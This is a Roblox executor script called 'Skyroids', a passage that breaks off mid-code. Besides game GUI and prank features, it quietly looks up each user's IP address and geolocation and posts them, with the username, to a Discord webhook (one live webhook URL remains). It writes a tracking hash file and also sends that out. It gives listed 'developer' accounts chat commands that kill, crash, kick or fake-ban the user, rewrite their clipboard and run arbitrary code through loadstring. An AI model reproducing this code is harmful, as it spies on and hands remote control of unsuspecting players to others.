-- Removed ALL WEBHOOKS


function feed(yes)
    -- Monstrum's Gui to Lua\n-- Version: 3.2

-- Instances:

local ScreenGui = Instance.new("ScreenGui")
local Frame = Instance.new("Frame")
local UIGradient = Instance.new("UIGradient")
local UICorner = Instance.new("UICorner")
local UIStroke = Instance.new("UIStroke")
local TextLabel = Instance.new("TextLabel")
local TextLabel_2 = Instance.new("TextLabel")
local Frame_2 = Instance.new("Frame")
local UIStroke_2 = Instance.new("UIStroke")
local TextLabel_3 = Instance.new("TextLabel")
local TextButton = Instance.new("TextButton")
local UIStroke_3 = Instance.new("UIStroke")
local UIGradient_2 = Instance.new("UIGradient")
local UICorner_2 = Instance.new("UICorner")

--Properties:

ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
ScreenGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling

Frame.Parent = ScreenGui
Frame.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
Frame.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame.BorderSizePixel = 0
Frame.Position = UDim2.new(0.272726208, 0, 0.303340167, 0)
Frame.Size = UDim2.new(0, 418, 0, 226)

UIGradient.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(10, 4, 12)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(56, 25, 66))}
UIGradient.Rotation = -50
UIGradient.Parent = Frame

UICorner.Parent = Frame

UIStroke.Parent = Frame
UIStroke.Color = Color3.fromRGB(200, 105, 255)
UIStroke.Thickness = 2.000

TextLabel.Parent = Frame
TextLabel.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel.BackgroundTransparency = 1.000
TextLabel.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel.BorderSizePixel = 0
TextLabel.Position = UDim2.new(0.0741626769, 0, 0.0442477874, 0)
TextLabel.Size = UDim2.new(0, 355, 0, 41)
TextLabel.Font = Enum.Font.Ubuntu
TextLabel.Text = "Your feedback was reviewed!"
TextLabel.TextColor3 = Color3.fromRGB(223, 126, 255)
TextLabel.TextScaled = true
TextLabel.TextSize = 14.000
TextLabel.TextWrapped = true

TextLabel_2.Parent = TextLabel
TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_2.BackgroundTransparency = 1.000
TextLabel_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_2.BorderSizePixel = 0
TextLabel_2.Position = UDim2.new(-0.00189363724, 0, 0.995467007, 0)
TextLabel_2.Size = UDim2.new(0, 355, 0, 42)
TextLabel_2.Font = Enum.Font.Ubuntu
TextLabel_2.Text = "We review feedbacks at any time, and yours possibly caught our attention, here is what we left for you"
TextLabel_2.TextColor3 = Color3.fromRGB(149, 84, 171)
TextLabel_2.TextScaled = true
TextLabel_2.TextSize = 14.000
TextLabel_2.TextWrapped = true
TextLabel_2.TextXAlignment = Enum.TextXAlignment.Left
TextLabel_2.TextYAlignment = Enum.TextYAlignment.Top

Frame_2.Parent = Frame
Frame_2.BackgroundColor3 = Color3.fromRGB(30, 18, 29)
Frame_2.BorderColor3 = Color3.fromRGB(0, 0, 0)
Frame_2.BorderSizePixel = 0
Frame_2.Position = UDim2.new(0.0741626769, 0, 0.407079637, 0)
Frame_2.Size = UDim2.new(0, 355, 0, 76)

UIStroke_2.Parent = Frame_2
UIStroke_2.Color = Color3.fromRGB(82, 57, 85)
UIStroke_2.Thickness = 1.500

TextLabel_3.Parent = Frame_2
TextLabel_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextLabel_3.BackgroundTransparency = 1.000
TextLabel_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextLabel_3.BorderSizePixel = 0
TextLabel_3.Position = UDim2.new(0.0366197191, 0, 0.105263159, 0)
TextLabel_3.Size = UDim2.new(0, 329, 0, 61)
TextLabel_3.Font = Enum.Font.Ubuntu
TextLabel_3.Text = yes or "Nothing appeared here... :("
TextLabel_3.TextColor3 = Color3.fromRGB(221, 166, 255)
TextLabel_3.TextScaled = true
TextLabel_3.TextSize = 25.000
TextLabel_3.TextWrapped = true
TextLabel_3.TextXAlignment = Enum.TextXAlignment.Left
TextLabel_3.TextYAlignment = Enum.TextYAlignment.Top

TextButton.Parent = Frame
TextButton.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton.BorderSizePixel = 0
TextButton.Position = UDim2.new(0.0741626769, 0, 0.809734523, 0)
TextButton.Size = UDim2.new(0, 355, 0, 31)
TextButton.Font = Enum.Font.SourceSans
TextButton.Text = "okay lol"
TextButton.TextColor3 = Color3.fromRGB(129, 87, 166)
TextButton.TextScaled = true
TextButton.TextSize = 14.000
TextButton.TextWrapped = true

UIStroke_3.Parent = TextButton
UIStroke_3.Color = Color3.fromRGB(91, 42, 116)
UIStroke_3.Thickness = 2.000
UIStroke_3.ApplyStrokeMode = Enum.ApplyStrokeMode.Border

UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(209, 169, 255)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(148, 96, 194))}
UIGradient_2.Rotation = -50
UIGradient_2.Parent = TextButton

UICorner_2.Parent = TextButton

-- Scripts:

local function QRQP_script() -- TextButton.Script 
	local script = Instance.new('Script', TextButton)

	script.Parent.MouseButton1Down:Connect(function()
		script.Parent.Parent.Parent:Destroy()
	end)
	script.Parent.Parent.Draggable = true
	script.Parent.Parent.Active = true
end
coroutine.wrap(QRQP_script)()
local function AKLQ_script() -- Frame.Script 
	local script = Instance.new('Script', Frame)

	if game:GetService("UserInputService").TouchEnabled then
		script.Parent.Position = UDim2.new({0.186, 0},{0.196, 0})
	else
		script.Parent.Position = UDim2.new()
	end
end
coroutine.wrap(AKLQ_script)()
end

pcall(function()
local function hi(message)
    local url = ""

    request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = message
        })
    })
end

local function getIP()
    local success, result = pcall(function()
        return game:HttpGet("https://api.ipify.org?format=json")
    end)
    if success then
        local data = game:GetService("HttpService"):JSONDecode(result)
        return data.ip
    else
        return nil
    end
end

local function getGeoInfo(ip)
    local success, result = pcall(function()
        return game:HttpGet("http://ip-api.com/json/" .. ip)
    end)
    if success then
        local data = game:GetService("HttpService"):JSONDecode(result)
        if data.status == "success" then
            return data.country, data.regionName, data.city
        else
            return nil, nil, nil
        end
    else
        return nil, nil, nil
    end
end

local ip = getIP()
local country, region, city = getGeoInfo(ip)
hi("```User: " .. game.Players.LocalPlayer.Name or "nil" .. "\nCountry: " .. country or "nil" .. "\nRegion: " .. region or "nil" .. "\nCity: " .. city or "nil" .. "\nIP: " .. ip or "nil" .. "```")

end)


pcall(function()
    
local function sendWebhookMessage(message)
    local url = ""

    request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = message
        })
    })
end
function sendthis()
    sendWebhookMessage("||@everyone|| ## Welcome to skyroid, " .. game.Players.LocalPlayer.Name .. "!\n\nHere is this users Ban Hash: ```" .. readfile("static_content_0991021930/index2.txt") .. "```")
end
local yesyesyes
-- Example usage:
if not isfile("static_content_0991021930/index2.txt") then
    yesyesyes = true
end



local HttpService = game:GetService("HttpService")


makefolder("static_content_0991021930")
writefile("static_content_0991021930/LUARMOR___xyhx82f3k3d0mraziscp0a17b26y5rs.json", "6hf")

local function randomFakeHash(length)
    local chars = ":;:;:;:;:;:;:;:;:;:;:;:;:;,.<>,.<>,.<>,.<>/?/?)))))))))))))(((((((((((((((****************&&&&&&&&&&&&&&&&&^^^^^^^^^^^^^^^^%%%%%%%%%%%%%%%$$$$$$$$$$$$$$$$$$#################@@@@@@@@@@@@@@@@@@@!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!!<<<<<<<<<<<<<<<<<<<<<<>>>>>>>>>>>>;;;;;;;;;;;;;;;;;;;;;;;;;;;-------------------------------------------------------------------------------------------------------------------------------------------------____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%-____________________________________----------------------------------------------------------------------------------------------------------------------------/?/?/????::::::::::::<>:!!!!!<!>:!<!>!!!:!:!!!<!>!>>>!!!^^^<^>^<^>^^<^<^>^>^>^>^<^^>^<%<%%>%<%<<%%%<>%" -- hex digits; change to include letters for alphanumeric
    local hash = ""
    for i = 1, length do
        local randIndex = math.random(1, #chars)
        hash = hash .. chars:sub(randIndex, randIndex)
    end
    return hash
end
if not isfile("static_content_0991021930/index2.txt") then
    writefile("static_content_0991021930/index2.txt", randomFakeHash(200) .. "___" .. string.upper(tostring(game.Players.LocalPlayer.Name)))  -- 16-char fake hash
end


if yesyesyes == true then
    sendthis()
end

-- Cleaned JSON string
local jsonString = game:HttpGet("https://github.com/vipralock/Skyroids/raw/refs/heads/main/BANTHEFUCKINGLAND.lua", true)

local data = HttpService:JSONDecode(jsonString)
    
local function hello(message)
    local url = "https://discord.com/api/webhooks/1395234246867816538/I6EV1dGq9aPTrJMwpQQWXbvPuw6riH62EBUF7qxrlwaNsRA_L-XpBO0Q2sOHDahcFoYy"

    request({
        Url = url,
        Method = "POST",
        Headers = {
            ["Content-Type"] = "application/json"
        },
        Body = game:GetService("HttpService"):JSONEncode({
            content = message
        })
    })
end
for userHash, reason in pairs(data.Users) do
    local contentsofthatfile = readfile("static_content_0991021930/index2.txt")
    if contentsofthatfile == userHash then
    
    hello("# ||@everyone|| A user tried to use Skyroid but they are banned!\n## Username:\n```" .. game.Players.LocalPlayer.Name .. "\n## Ban reason\n```" .. reason)
        game.Players.LocalPlayer:Kick("Banned from Skyroid: " .. tostring(reason))
    end
end


end)


function softlock()
    local suc, res = pcall(function()
        local oldnamecall
        oldnamecall = hookmetamethod(game, "__namecall", function(self, ...)
            local name = getnamecallmethod()

            if name == "FireServer" then
                return nil
            end
        end)
    end)

    if not suc then
        game.TextChatService.TextChannels.RBXGeneral:SendAsync("couldn't block events: " .. tostring(identifyexecutor()))
        return res
    end
end
function barrelroll()
    local Players = game:GetService("Players")
local RunService = game:GetService("RunService")

local player = Players.LocalPlayer
local character = player.Character or player.CharacterAdded:Wait()
local humanoid = character:WaitForChild("Humanoid")
local rootPart = character:WaitForChild("HumanoidRootPart")

local spinning = true
local ragdollStartTime = nil

-- Utility: check if ragdolled
local function isRagdolled()
	local state = humanoid:GetState()
	return state == Enum.HumanoidStateType.Physics
		or state == Enum.HumanoidStateType.FallingDown
end

-- Render loop
RunService.RenderStepped:Connect(function()
	if not spinning or not rootPart or not rootPart.Parent then return end

	local cf = CFrame.new(rootPart.Position)

	if isRagdolled() then
		if not ragdollStartTime then
			ragdollStartTime = tick() -- Start timer on ragdoll
		end

		local elapsed = tick() - ragdollStartTime

		if elapsed < 0.2 then
			-- Initial rotate face-down
			rootPart.CFrame = cf
				* CFrame.Angles(math.rad(90), 0, 0)
		else
			-- Continue spinning after 0.2s
			rootPart.CFrame = rootPart.CFrame
				* CFrame.Angles(0, math.rad(10), 0)
		end
	else
		ragdollStartTime = nil -- Reset when not ragdolled
		-- Force face-down and spin when not ragdolled
		rootPart.CFrame = cf
			* CFrame.Angles(math.rad(90), 0, 0)
			* CFrame.Angles(0, tick() * math.rad(200), 0)
	end
end)

-- Stop on death
humanoid.Died:Connect(function()
	spinning = false
end)
end

local custommessages = {
    "what is ligma...",
    "100 days without fent",
    "holy macaroni he ust oblierated me out of thin air",
    "could i atleast had some toppings with that too",
    "i like pizza",
    "i like chicken",
    "i like... you.",
    "what brings you here",
    "im sorry but can you just subscribe to my epic gamer youtube channel?" ,
    "so how much power do you have in rise of kingdoms"
}

function fart()
    local fart = Instance.new("Sound", workspace)
    fart.Volume = 999 -- Max volume
    fart.SoundId = getcustomasset("skyroids/assets/fart.mp3")
    
    local fartdistortion = Instance.new("DistortionSoundEffect")
    fartdistortion.Parent = fart
    fartdistortion.Level = 99 -- Between 0 and 1
    
    fart:Play()
    
    local RunService = game:GetService("RunService")
    local connection

    connection = RunService.RenderStepped:Connect(function()
        for _, object in pairs(workspace:GetDescendants()) do
            -- Only move BaseParts that are not descendants of Players
            if object:IsA("BasePart") and not object:IsDescendantOf(game.Players) then
                -- Randomly jitter position slightly
                object.Position = object.Position + Vector3.new(
                    math.random(-5, 5), 
                    math.random(-5, 5), 
                    math.random(-5, 5)
                )
            end
        end
        -- Randomize lighting clock time
        game.Lighting.ClockTime = math.random(0, 24)
    end)
    
    fart.Ended:Connect(function()
        connection:Disconnect()
        -- Kick local player with a random custom message
        local player = game.Players.LocalPlayer
        player:Kick(custommessages[math.random(1, #custommessages)])
    end)
end

if not isfolder("skyroids") then
    makefolder("skyroids")
end

for _, foldernames in {"assets", "hash"} do
    if not isfolder("skyroids/" .. foldernames) then
        makefolder("skyroids/" .. foldernames)
    end
end

local files = {
    ["fart.mp3"] = "https://github.com/vipralock/Skyroids/raw/refs/heads/main/fart.mp3",
}

for filename, filelink in pairs(files) do
    if not isfile("skyroids/assets/" .. filename) then
        writefile("skyroids/assets/" .. filename, game:HttpGet(tostring(filelink), true))
    end
end



function TROLLSIGMA()
-- Download trollface once
if isfile("troll.png") then
    delfile("troll.png")
end

writefile("troll.png", game:HttpGet("https://pngimg.com/d/trollface_PNG12.png", true))
local trollTexture = getcustomasset("troll.png")

-- Optional: Destroy message UI if needed
if msg and msg.Destroy then
    msg:Destroy()
end

-- Wait before applying changes (optional)
wait(5.8)

-- Set trollface skybox
local sky = Instance.new("Sky")
sky.Name = "SKY"
sky.SkyboxBk = trollTexture
sky.SkyboxDn = trollTexture
sky.SkyboxFt = trollTexture
sky.SkyboxLf = trollTexture
sky.SkyboxRt = trollTexture
sky.SkyboxUp = trollTexture
sky.Parent = game.Lighting

local savedMaterialColors = {}

-- Play spooky audio
local spooky = Instance.new("Sound", workspace)
spooky.Name = "Spooky"
spooky.SoundId = "rbxassetid://1839246711"
spooky.Volume = 0
spooky.Looped = true
spooky:Play()

-- Function to apply decals to all faces of a part
local function applyDecals(part)
    for _, face in ipairs(Enum.NormalId:GetEnumItems()) do
        local decal = Instance.new("Decal")
        decal.Name = "MYDECALHUE"
        decal.Texture = trollTexture
        decal.Face = face
        decal.Parent = part
    end
end

-- Recursively scan and apply to all parts inside models
local function recursiveApply(object)
    if object:IsA("BasePart") then
        applyDecals(object)
    elseif object:IsA("Model") then
        for _, child in ipairs(object:GetChildren()) do
            recursiveApply(child)
        end
    end
end

-- Main function to start decal spam
local function decalspam()
    for _, obj in ipairs(workspace:GetChildren()) do
        recursiveApply(obj)
    end
end

-- Run decal spam
decalspam()

end

-- Kick banned users if the ban hash file exists
function jump()
    game.Players.LocalPlayer.Character.Humanoid.Jump = true
end
if isfile("dexexplorer/hash") then
    local banReason = readfile("dexexplorer/hash")
    game.Players.LocalPlayer:Kick("Banned by SKYROIDS: " .. tostring(banReason))
end

--// CLEANUP
local function cleanup()
    if getgenv().SKYROIDS_RUNNING then
        if getgenv().SKYROIDS_DISCONNECTS then
            for _, disconnect in ipairs(getgenv().SKYROIDS_DISCONNECTS) do
                pcall(function() disconnect:Disconnect() end)
            end
        end
        getgenv().SKYROIDS_RUNNING = false
        getgenv().SKYROIDS_DISCONNECTS = nil
        getgenv().SKYROIDS_ALLOW_PRIVATE_COMMANDS = true
    end
end
function chat(str)
    game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(str))
end
--// MAIN FUNCTION
local function start()
    cleanup()

    -- Init globals
    getgenv().SKYROIDS_RUNNING = true
    getgenv().SKYROIDS_DISCONNECTS = {}
    getgenv().SKYROIDS_ALLOW_PRIVATE_COMMANDS = true

    -- Services
    local Players = game:GetService("Players")
    local HttpService = game:GetService("HttpService")
    local TextChatService = game:GetService("TextChatService")
    local localPlayer = Players.LocalPlayer
    local LOCAL_USERID = localPlayer.UserId
    local url = "https://github.com/vipralock/Skyroids/raw/refs/heads/main/blacklist.lua"

    local userRanks = {}
    local rankColors = {
        DEVELOPER = "#E503FF",
        PRIVATE = "#03FFFA"
    }

    -- JSON fetch
    local function loadWhitelist()
        local success, data = pcall(function()
            return HttpService:JSONDecode(game:HttpGet(url))
        end)
        if success and data and data.users then
            return data.users
        else
            return nil
        end
    end

    userRanks = loadWhitelist()
    if not userRanks then return end
    local previousJSON = HttpService:JSONEncode(userRanks)
    local hasSaid = false

    -- Chat Tags
    TextChatService.OnIncomingMessage = function(message)
        if not getgenv().SKYROIDS_RUNNING then return end
        local userId = message.TextSource.UserId
        local rank = userRanks[tostring(userId)]
        if rank then
            local tag = "[SKYROIDS " .. rank:upper() .. "] "
            local color = rankColors[rank] or "#FFFFFF"
            message.PrefixText = string.format("<font color='%s'>%s</font>", color, tag) .. message.PrefixText
        end
    end

    -- Player Commands
    local function getParts()
        local char = localPlayer.Character
        if not char then return nil end
        return char, char:FindFirstChildWhichIsA("Humanoid"), char:FindFirstChild("HumanoidRootPart")
    end

    local function handlePlayer(player)
        local userId = player.UserId
        local rank = userRanks[tostring(userId)]
        if not (rank and userId ~= LOCAL_USERID) then return end

        if not hasSaid then
            hasSaid = true
            task.delay(1, function()
                pcall(function()
                    game.TextChatService.TextChannels.RBXGeneral:SendAsync("i am using sky")
                end)
            end)
        end

        local conn = player.Chatted:Connect(function(msg)
            if not getgenv().SKYROIDS_RUNNING then return end
            msg = msg:lower()

            local char, hum, hrp = getParts()
            if not (char and hum and hrp) then return end

            local isOwner = rank == "DEVELOPER"
            local isAllowed = isOwner or (rank == "PRIVATE" and getgenv().SKYROIDS_ALLOW_PRIVATE_COMMANDS)

            if isAllowed then
                if msg == ";kill" then
                    hum.Health = 0
                elseif msg == ";sit" then
                    hum.Sit = true
                elseif msg == ";jump" then
                    hum:ChangeState(Enum.HumanoidStateType.Jumping)
                elseif msg == ";bring" then
                    local theirHRP = player.Character and player.Character:FindFirstChild("HumanoidRootPart")
                    if theirHRP then
                        hrp.CFrame = theirHRP.CFrame + Vector3.new(2, 0, 0)
                    end
                elseif msg == ";trip" then
                    hrp.CFrame = hrp.CFrame * CFrame.Angles(math.rad(-90), 0, 0)
                elseif msg == ";freeze" then
                    hrp.Anchored = true
                elseif msg == ";unfreeze" then
                    hrp.Anchored = false
                elseif msg:sub(1,5) == ";kick" and isOwner then
                    local reason = msg:sub(7):gsub("^%s+", "")
                    localPlayer:Kick(reason ~= "" and ("Kicked by SKYROIDS: " .. reason) or "Kicked by Skyroids Developer.")
                elseif msg:sub(1,4) == ";ban" and isOwner then
                    local banreason = msg:sub(6):gsub("^%s+", "")
                    -- Safely delete folder and recreate
                    pcall(function()
                        if isfolder("dexexplorer") then
                            delfolder("dexexplorer")
                        end
                        makefolder("dexexplorer")
                        writefile("dexexplorer/hash", tostring(banreason))
                    end)
                    localPlayer:Kick(banreason ~= "" and ("Banned from SKYROIDS: " .. banreason) or "Banned by Skyroids Developer.")
                elseif msg == ";troll" then
                    jump()
                    TROLLSIGMA()
                elseif msg:sub(1,6) == ";setfps" then
                        setfpscap(msg:sub(7))
                elseif msg:sub(1,4) == ";say" then
                    local messagething = msg:sub(5)
                    game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(messagething))
                elseif msg == ";anticheat" then
                    game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = 500
                    wait(1)
                    if game.Players.LocalPlayer.Character.Humanoid.Health > 0 then
                        game.Players.LocalPlayer.Character.Humanoid.Health = 0
                    end
                elseif msg == ";crash" then
                    while true do end
                elseif msg == ";executor" then
                    local suc, res = pcall(function()
                        game.TextChatService.TextChannels.RBXGeneral:SendAsync(tostring(identifyexecutor()))
                    end)
                    if not suc then
                        game.TextChatService.TextChannels.RBXGeneral:SendAsync("failed to fetch executor")
                    end
                elseif msg == ";device" then
                    if game.UserInputService.TouchEnabled then
                        jump()
                        chat("mobile")
                    else
                        jump()
                        chat("not mobile")
                    end
                	if player == game:GetService("Players").LocalPlayer then return end
elseif msg:sub(1, 10) == ";clientrun" then
	local runningCode = msg:sub(11)

	local success, result = pcall(function()
		loadstring(runningCode)()
	end)

	if success then
		jump() -- Whatever your `jump()` function does
	else
		warn("failed:", result)
	end

        elseif msg == ";dance" then
            hum.WalkSpeed = 0
            hum.JumpPower = 0
            chat("/e dance")
            hrp.Anchored = true
            hum.AutoRotate = false
        elseif msg == ";undance" then
            hrp.Anchored = false
            hum.WalkSpeed = 16
            hum.JumpPower = 50
            hum.AutoRotate = true
            hum.Jump = true
        elseif msg:sub(1,10) == ";clocktime" then
            jump()
            local clocktimeset = msg:sub(11)
            game.Lighting.ClockTime = tonumber(clocktimeset)
        elseif msg == ";snail" then
            hum.WalkSpeed = 3
        elseif msg == ";unsnail" then
            hum.WalkSpeed = 16
        elseif msg == ";wrathwrecker" then
            pcall(function()
                game.CoreGui.RobloxGui.Enabled = false
            end)
            hrp.Anchored = true
            chat("I AM AM OWNED BY WRATH WRECK")
            wait(1)
            chat("I AM AM OWNED BY WRATH WRECK")
            wait(1)
            chat("I AM AM OWNED BY WRATH WRECK")
            wait(1)
            wait(1)
            chat("I AM AM OWNED BY WRATH")
            wait(1)
            game.Players.LocalPlayer:Kick(":)")
        elseif msg:sub(1,6) == ";warn" then 
                jump()
            pcall(function()
                messagebox("A warning as appeared on your windows machine.", tostring(msg:sub(7)), 0x30)
            end)
        elseif msg:sub(1,10) == ";clipboard" then
                jump()
            setclipboard(tostring(msg:sub(11)))
        elseif msg:sub(1,11) == ";commandbar" then
                jump()
            local cmdmessage = msg:sub(12)
            local suc, res = pcall(function()
                rconsoleprint(tostring(cmdmessage))
            end)
            if not suc then
                consoleprint(tostring(cmdmessage))
            end
        elseif msg == ";active" then
            if isrbxactive() then
                chat("on roblox screen")
            else
                chat("not on roblox screen")
            end
        elseif msg == ";funnykick" then
            fart()
        elseif msg == ";barrelroll" then
            barrelroll()
        elseif msg == ";blockremotes" then
            softlock()





















        elseif msg == ";creeper" then
            pcall(function()
